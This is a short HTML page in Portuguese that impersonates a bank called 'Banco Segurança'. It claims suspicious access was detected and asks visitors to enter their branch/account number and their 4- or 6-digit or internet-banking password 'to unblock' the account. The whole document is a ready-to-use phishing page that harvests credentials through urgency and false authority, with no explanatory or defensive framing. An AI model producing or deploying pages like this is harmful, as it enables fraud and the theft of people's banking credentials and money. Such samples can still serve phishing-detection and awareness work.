<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<title>Validação de Segurança</title>
<style>
    body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
    .box { background: white; padding: 20px; border-top: 5px solid #cc0000; max-width: 400px; margin: auto; }
    input { width: 90%; padding: 10px; margin: 10px 0; }
    button { background: #cc0000; color: white; padding: 10px 20px; border: none; cursor: pointer; }
</style>
</head>
<body>
    <div class="box">
        <h2>Banco Segurança</h2>
        <p>Detectamos um acesso suspeito.</p>
        <p>Por favor, confirme sua senha de 4 dígitos ou internet banking para desbloquear.</p>
        <form action="/login" method="POST">
            <input type="text" name="agencia" placeholder="Agência / Conta">
            <input type="password" name="password" placeholder="Senha (4 ou 6 dígitos)">
            <button type="submit">Validar</button>
        </form>
    </div>
</body>
</html>
